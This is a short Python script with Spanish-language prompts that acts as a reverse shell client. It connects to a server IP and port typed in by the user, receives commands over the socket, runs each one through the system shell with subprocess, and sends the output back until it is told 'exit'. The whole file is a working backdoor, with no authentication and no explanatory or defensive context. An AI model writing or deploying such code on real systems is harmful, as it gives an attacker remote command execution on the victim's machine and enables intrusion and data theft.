import socket
import subprocess

def connect(server_ip, server_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((server_ip, server_port))
        print("Conexión establecida exitosamente con el servidor.")
    except socket.error as e:
        print("Error al conectar al servidor:", e)
        return

    while True:
        command = s.recv(1024).decode()

        if command.lower() == 'exit':
            break

        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_result = output.stdout.read() + output.stderr.read()

        s.send(output_result)

    s.close()

server_ip = input("Ingresa la dirección IP del servidor: ")
server_port = int(input("Ingresa el puerto del servidor: "))

connect(server_ip, server_port)
